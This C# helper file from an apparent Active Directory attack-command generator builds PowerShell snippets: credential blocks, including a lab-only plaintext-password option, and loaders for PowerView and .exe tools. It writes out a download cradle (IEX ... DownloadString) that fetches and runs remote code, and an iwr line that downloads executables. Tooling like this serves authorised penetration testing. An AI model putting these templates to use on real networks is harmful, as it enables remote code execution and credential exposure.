using System.Collections.Generic;

namespace AD_Commander.Generators;

// Small shared helpers for the command generators. Intentionally minimal: only the
// pieces that were duplicated across several generators live here (spec section 2).
public static class GeneratorHelpers
{
    // Escape single quotes so a value can't break out of a PowerShell single-quoted string.
    public static string EscapeSingleQuotes(string value) => value.Replace("'", "''");

    // The default "secure" credential block: PowerShell prompts for the password at runtime
    // (Read-Host -AsSecureString), so it never enters this app. Returns the lines to insert,
    // including the trailing blank line.
    public static List<string> SecureCredentialBlock(string domain, string username)
    {
        return new List<string>
        {
            "$SecPassword = Read-Host \"Credential password\" -AsSecureString",
            $"$Cred = New-Object System.Management.Automation.PSCredential('{EscapeSingleQuotes(domain)}\\{EscapeSingleQuotes(username)}', $SecPassword)",
            ""
        };
    }

    // The "inline" credential block: the password is embedded in the script in clear text.
    // Lab use only. Returns the lines to insert, including the trailing blank line.
    public static List<string> InlineCredentialBlock(string domain, string username, string password)
    {
        return new List<string>
        {
            "# !!! INSECURE: the password is embedded in clear text below. Use only in an isolated lab. !!!",
            $"$SecPassword = ConvertTo-SecureString '{EscapeSingleQuotes(password)}' -AsPlainText -Force",
            $"$Cred = New-Object System.Management.Automation.PSCredential('{EscapeSingleQuotes(domain)}\\{EscapeSingleQuotes(username)}', $SecPassword)",
            ""
        };
    }

    // Pick the credential block based on the global SecureMode flag.
    public static List<string> CredentialBlock(string domain, string username, string password, bool secureMode)
        => secureMode
            ? SecureCredentialBlock(domain, username)
            : InlineCredentialBlock(domain, username, password);

    // The PowerView import line used by every PowerView-based generator.
    public const string PowerViewImport = "Import-Module .\\PowerView.ps1";

    // How PowerView gets loaded: a local import, or an in-memory download cradle from a URL.
    public static string PowerViewImportLine(bool download, string url)
        => (download && url.Length > 0)
            ? $"IEX (New-Object Net.WebClient).DownloadString('{EscapeSingleQuotes(url)}')"
            : PowerViewImport;

    // For .exe tools: when download is on, the iwr line that fetches the exe to the current dir.
    // Empty when off. Prepend these lines before the command.
    public static List<string> ExeDownloadLines(string exeName, bool download, string url)
        => (download && url.Length > 0)
            ? new List<string> { $"iwr '{EscapeSingleQuotes(url)}' -OutFile .\\{exeName}", "" }
            : new List<string>();

    // The token used to invoke the exe: ".\Tool.exe" when just downloaded, else "Tool.exe".
        // The token used to invoke the exe. Always ".\Tool.exe": PowerShell will not run an exe from
    // the current directory by name alone (the current dir is not on PATH), so the .\ prefix is required.
    public static string ExeInvocation(string exeName)
        => ".\\" + exeName;
}
